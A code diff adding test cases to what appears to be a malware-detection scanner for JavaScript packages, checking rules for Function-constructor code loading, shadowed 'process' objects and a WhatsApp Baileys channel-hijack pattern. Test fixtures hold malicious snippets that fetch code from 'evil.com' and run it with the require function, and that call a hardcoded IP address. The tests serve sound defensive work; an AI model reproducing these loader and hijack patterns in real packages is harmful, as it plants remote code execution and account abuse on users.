@@ -3458,6 +3458,104 @@ console.log(v);
       assert(!t, 'require("process").version should NOT trigger require_process_mainmodule');
     } finally { cleanupTemp(tmp); }
   });
+  // === v2.10.89: Security review rules ===
+
+  // --- function_constructor_require ---
+  await asyncTest('AST: function_constructor_require — detects new Function.constructor("require", s)', async () => {
+    const tmp = makeTempPkg(`
+const process = { env: { DEV_API_KEY: "https://evil.com" } };
+const src = process.env.DEV_API_KEY;
+const axios = require('axios');
+const s = (await axios.get(src)).data.Cookie;
+const handler = new Function.constructor("require", s);
+handler(require);
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'function_constructor_require');
+      assert(t, 'Should detect new Function.constructor("require", ...)');
+      assert(t.severity === 'CRITICAL', 'Should be CRITICAL');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: function_constructor_require — does NOT fire on new Function("return 1")', async () => {
+    const tmp = makeTempPkg(`
+const fn = new Function("return 1");
+console.log(fn());
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'function_constructor_require');
+      assert(!t, 'new Function("return 1") should NOT trigger function_constructor_require');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // --- process_variable_shadow ---
+  await asyncTest('AST: process_variable_shadow — detects const process = { env: {...} }', async () => {
+    const tmp = makeTempPkg(`
+const process = { env: { HOST: "http://173.211.46.220" } };
+const url = process.env.HOST;
+fetch(url);
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'process_variable_shadow');
+      assert(t, 'Should detect process variable shadowing');
+      assert(t.severity === 'HIGH', 'Should be HIGH');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: process_variable_shadow — does NOT fire on const proc = {...}', async () => {
+    const tmp = makeTempPkg(`
+const proc = { env: { HOST: "http://localhost:3000" } };
+console.log(proc.env.HOST);
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'process_variable_shadow');
+      assert(!t, 'Different variable name should NOT trigger');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // --- newsletter_auto_follow ---
+  await asyncTest('AST: newsletter_auto_follow — detects Baileys newsletter hijack pattern', async () => {
+    const tmp = makeTempPkg(`
+const { WAProto } = require('@whiskeysockets/baileys');
+const AUTO_FOLLOW_CHANNELS = [
+  "120363423975826201@newsletter",
+  "120363425157057473@newsletter"
+];
+async function newsletterWMexQuery(jid, action) {
+  // WhatsApp newsletter query
+}
+setTimeout(async () => {
+  for (const jid of AUTO_FOLLOW_CHANNELS) {
+    await newsletterWMexQuery(jid, Types.QueryIds.FOLLOW);
+  }
+}, 10000);
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'newsletter_auto_follow');
+      assert(t, 'Should detect Baileys newsletter auto-follow pattern');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: newsletter_auto_follow — does NOT fire on email newsletter module', async () => {
+    const tmp = makeTempPkg(`
+// Email newsletter subscription management
+const newsletter = require('./newsletter');
+function subscribe(email) {
+  return newsletter.FOLLOW(email);
+}
+module.exports = { subscribe };
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'newsletter_auto_follow');
+      assert(!t, 'Email newsletter module should NOT trigger (no Baileys context)');
+    } finally { cleanupTemp(tmp); }
+  });
 }
 
 module.exports = { runAstTests };
